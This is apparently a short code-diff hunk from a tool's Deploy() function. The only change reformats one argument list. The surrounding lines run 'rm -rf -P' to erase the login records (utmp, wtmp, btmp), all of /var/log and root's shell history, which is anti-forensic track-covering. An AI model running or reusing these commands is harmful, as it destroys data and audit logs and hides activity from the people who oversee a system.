@@ -27,7 +27,7 @@ function Deploy() {
   //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
   ForkExecuteCommand("rm", ["-rf", "-P", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
   LogInfo("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
-  ForkExecuteCommand("rm", ["-rf","-P","/var/root/.sh_history"]);
+  ForkExecuteCommand("rm", ["-rf", "-P", "/var/root/.sh_history"]);
   LogInfo("Cleared the root bash history");
   return true;
 }
